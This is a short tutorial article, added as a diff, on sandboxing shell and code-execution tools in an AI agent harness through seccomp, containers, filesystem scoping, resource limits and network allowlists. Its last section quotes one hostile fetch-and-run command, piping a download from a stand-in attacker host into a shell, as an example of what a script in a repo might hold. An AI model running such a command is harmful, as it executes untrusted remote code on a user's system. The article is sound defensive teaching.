@@ -1,0 +1,44 @@
+---
+title: "Sandboxing Tool Execution in a Harness"
+track: "harness-design"
+status: live
+summary: "Running shell and code tools in isolated subprocesses so one bad command can't take down the host machine."
+duration: "6 min read"
+---
+
+An agent that can run shell commands or execute code is only as safe as the box you run them in. Sandboxing is the layer of the harness that decides what a tool call can actually touch — which files, which network, which processes — before the model's intent ever reaches the operating system.
+
+## Why the model isn't the safety boundary
+
+You can tell a model "never delete files outside the project directory" in a system prompt, and it will usually listen. Usually isn't a security property. A model can misread a path, get steered by a prompt injection buried in a file it read, or simply make a mistake the way any engineer does at 2am. The fix isn't a better instruction — it's putting a real boundary between the tool call and the machine, the same way you'd sandbox any untrusted input in a normal application. See [Deny-Floors: Rules No Prompt Can Override](/learn/harness-design/deny-floors-and-policy-layers) for the policy side of this; sandboxing is the execution-time enforcement.
+
+## What isolation actually looks like
+
+In practice, "isolate the subprocess" means picking a containment layer and giving it the narrowest grant that still lets the tool do its job:
+
+- **OS-level sandboxes** — `seccomp-bpf` filters on Linux restrict which syscalls a process can even make (no raw sockets, no `ptrace`, no mount). macOS's Seatbelt (`sandbox-exec`) does something similar with a declarative profile.
+- **Namespaces and containers** — running the tool in its own container (Docker, gVisor, Firecracker microVMs) gives it a private filesystem view, its own process tree, and a network namespace you can drop entirely or route through an egress proxy.
+- **Filesystem scoping** — mount only the working directory read-write, everything else read-only or absent. A shell tool that can't `cd` out of `/workspace` can't `rm -rf /home`.
+- **Resource limits** — CPU, memory, wall-clock, and process-count ceilings (`ulimit`, cgroups) stop a runaway loop or fork bomb from taking the host down with it.
+- **Network policy** — the highest-leverage single control. An agent with filesystem access but no network can't exfiltrate anything it reads. If the tool genuinely needs network, allowlist destinations rather than opening it wide.
+
+None of these are exotic — they're the same primitives you'd reach for to run untrusted user code on a SaaS platform. An agent harness is just another place where code you didn't write (in this case, generated at runtime by a model) is about to execute.
+
+## Matching the sandbox to the tool
+
+Not every tool needs the same containment. A read-only "search the docs" tool and an "execute arbitrary shell" tool sit at opposite ends of the risk spectrum, and treating them identically either over-restricts the safe tool or under-restricts the dangerous one. A reasonable default:
+
+```text
+read-only tools     → no sandbox needed, just scope the inputs
+file-writing tools   → filesystem jail + resource limits
+shell/code execution → full subprocess isolation: container +
+                        seccomp + no network by default + timeout
+```
+
+This is the same tiering that shows up in [Allow/Ask/Deny: Designing Approval Gates](/learn/harness-design/permission-and-approval-systems) — sandboxing and approval gates are two independent controls, and a well-designed harness uses both rather than picking one. A command can be both sandboxed *and* require human approval; sandboxing bounds the damage if approval is granted in error, approval bounds what happens even inside a permissive sandbox.
+
+## The failure mode sandboxing prevents
+
+The scenario worth designing against isn't "the model tries to do something malicious" — it's the model doing exactly what it was asked, on an input it trusted, that turns out to be hostile. A code-execution tool asked to "run this script from the repo" that turns out to contain `curl attacker.com | sh` is not a hypothetical; it's the default outcome of running arbitrary code without containment. Sandboxing is what makes that an inconvenience instead of an incident.
+
+**Related:** [Sandboxing Tool Execution](/learn/tools-function-calling/sandboxing-tool-execution), [Deny-Floors: Rules No Prompt Can Override](/learn/harness-design/deny-floors-and-policy-layers), [Allow/Ask/Deny: Designing Approval Gates](/learn/harness-design/permission-and-approval-systems)
